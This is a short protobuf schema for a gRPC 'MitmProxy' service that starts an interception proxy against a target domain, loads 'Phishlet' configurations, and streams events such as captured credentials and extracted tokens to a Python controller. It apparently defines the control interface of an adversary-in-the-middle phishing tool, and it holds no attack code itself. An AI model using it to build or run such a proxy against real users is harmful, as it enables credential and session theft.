syntax = "proto3";

package mitm;

option go_package = "./pb";

service MitmProxy {
    // Starts the interception proxy
    rpc StartProxy (StartRequest) returns (StartResponse);
    
    // Stops the interception proxy
    rpc StopProxy (StopRequest) returns (StopResponse);
    
    // Loads a specific "Phishlet" configuration
    rpc LoadPhishlet (LoadPhishletRequest) returns (LoadPhishletResponse);
    
    // Streams intercepted telemetry back to the Python controller
    rpc StreamTelemetry (TelemetryRequest) returns (stream TelemetryEvent);
}

message StartRequest {
    string listen_address = 1;
    string target_domain = 2;
}

message StartResponse {
    bool success = 1;
    string message = 2;
}

message StopRequest {}

message StopResponse {
    bool success = 1;
    string message = 2;
}

message LoadPhishletRequest {
    string phishlet_name = 1;
    string config_json = 2;
}

message LoadPhishletResponse {
    bool success = 1;
    string message = 2;
}

message TelemetryRequest {}

message TelemetryEvent {
    enum EventType {
        UNKNOWN = 0;
        TOKEN_EXTRACTED = 1;
        HSTS_BLOCKED = 2;
        CREDENTIAL_CAPTURED = 3;
        GENERAL_LOG = 4;
    }
    EventType type = 1;
    string source_ip = 2;
    string payload = 3; // JSON containing event details
    int64 timestamp = 4;
}
